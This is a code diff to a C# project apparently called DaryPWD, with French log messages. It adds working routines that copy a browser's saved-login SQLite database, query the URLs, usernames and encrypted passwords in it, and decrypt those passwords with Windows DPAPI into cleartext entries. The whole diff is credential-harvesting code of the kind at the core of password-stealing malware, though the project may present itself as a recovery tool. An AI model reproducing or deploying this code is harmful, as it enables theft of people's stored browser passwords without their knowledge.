@@ -5,6 +5,7 @@ using System.Security;
 using Microsoft.Win32;
 using System.Text;
 using System.IO;
+using System.Data.SQLite;
 
 namespace DaryPWD
 {
@@ -1034,27 +1035,68 @@ namespace DaryPWD
             try
             {
                 LogMessage($"Tentative d'extraction depuis la base {browserName}: {dbPath}");
-                
-                // Copier la base de données pour pouvoir la lire (le navigateur peut la verrouiller)
+
                 string tempDbPath = Path.Combine(Path.GetTempPath(), $"{browserName}LoginData_{Guid.NewGuid()}.db");
                 
                 try
                 {
                     File.Copy(dbPath, tempDbPath, true);
                     LogMessage($"Base de données copiée vers: {tempDbPath}");
-                    
-                    // Note: Pour lire une base SQLite sans dépendances externes, on devrait utiliser System.Data.SQLite
-                    // Pour l'instant, on note que la base existe mais on ne peut pas la lire sans SQLite
-                    LogMessage($"Note: L'extraction SQLite nécessiterait System.Data.SQLite (non inclus pour la portabilité)");
-                    LogMessage($"Les mots de passe {browserName} peuvent aussi être dans Credential Manager (déjà extraits)");
-                    
-                    // Supprimer le fichier temporaire
-                    try { File.Delete(tempDbPath); } catch { }
+
+                    string connectionString = $"Data Source={tempDbPath};Version=3;New=False;Compress=True;";
+                    using (SQLiteConnection connection = new SQLiteConnection(connectionString))
+                    {
+                        connection.Open();
+                        string sql = "SELECT origin_url, username_value, password_value FROM logins";
+                        using (SQLiteCommand command = new SQLiteCommand(sql, connection))
+                        using (SQLiteDataReader reader = command.ExecuteReader())
+                        {
+                            while (reader.Read())
+                            {
+                                try
+                                {
+                                    string url = reader.GetString(0);
+                                    string username = reader.GetString(1);
+                                    byte[] encryptedPasswordBytes = (byte[])reader[2];
+
+                                    if (string.IsNullOrEmpty(url) || encryptedPasswordBytes.Length == 0)
+                                    {
+                                        continue;
+                                    }
+
+                                    string decryptedPassword = DecryptDPAPI(encryptedPasswordBytes);
+
+                                    if (!string.IsNullOrEmpty(decryptedPassword) && IsValidPassword(decryptedPassword))
+                                    {
+                                        entries.Add(new PasswordEntry
+                                        {
+                                            EntryName = url,
+                                            Type = browserName,
+                                            StoredIn = $"{browserName} Database",
+                                            UserName = username,
+                                            Password = decryptedPassword
+                                        });
+                                        LogMessage($"✓ Ajouté {browserName}: {url} | User: {username}");
+                                    }
+                                }
+                                catch (Exception ex)
+                                {
+                                    LogMessage($"Erreur lecture entrée {browserName}: {ex.Message}");
+                                }
+                            }
+                        }
+                    }
                 }
                 catch (Exception ex)
                 {
-                    LogMessage($"Erreur copie base {browserName}: {ex.Message}");
-                    // Le navigateur peut verrouiller le fichier, c'est normal
+                    LogMessage($"Erreur copie/lecture base {browserName}: {ex.Message}");
+                }
+                finally
+                {
+                    if (File.Exists(tempDbPath))
+                    {
+                        try { File.Delete(tempDbPath); } catch { }
+                    }
                 }
             }
             catch (Exception ex)
